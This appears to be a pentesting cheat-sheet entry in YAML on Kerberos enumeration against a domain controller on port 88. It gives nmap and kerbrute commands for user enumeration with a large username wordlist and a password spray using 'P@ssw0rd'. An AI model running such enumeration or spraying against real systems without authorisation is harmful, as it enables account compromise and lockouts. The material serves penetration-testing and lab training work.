---
description: |
  Kerberos enumeration — user enumeration, pre-auth checks, and password spraying against the KDC on port 88.
commands:
  - have: No_Creds
    cmd: |
      # Nmap — confirm Kerberos is running
      nmap -p 88 10.10.10.27

      # Kerbrute — enumerate valid domain users from a wordlist
      kerbrute userenum --dc 10.10.10.27 -d senshu.sh /usr/local/share/SecLists/Usernames/xato-net-10-million-usernames.txt -o users.txt
  - have: Username
    cmd: |
      # Kerbrute — enumerate with a custom user list
      kerbrute userenum --dc 10.10.10.27 -d senshu.sh custom_users.txt -o valid_users.txt

      # Kerbrute — password spray against validated users
      kerbrute passwordspray --dc 10.10.10.27 -d senshu.sh valid_users.txt 'P@ssw0rd'
phase:
  - Enumeration
target_os:
  - Windows
services:
  - Kerberos
techniques: []
references:
  - https://github.com/ropnop/kerbrute
  - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html
---
